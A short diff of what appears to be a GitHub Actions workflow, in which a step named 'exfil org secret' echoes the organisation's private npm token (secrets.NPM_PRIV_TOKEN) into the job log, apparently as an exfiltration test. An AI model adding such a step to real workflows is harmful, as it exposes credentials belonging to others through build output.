@@ -11,5 +11,6 @@ jobs:
     - name: exfil org secret
       id: response
       run:  |
+          echo "lets exfil some org secrets..."
           echo "${{secrets.NPM_PRIV_TOKEN}}"
-          echo "exfil secrets"
+          
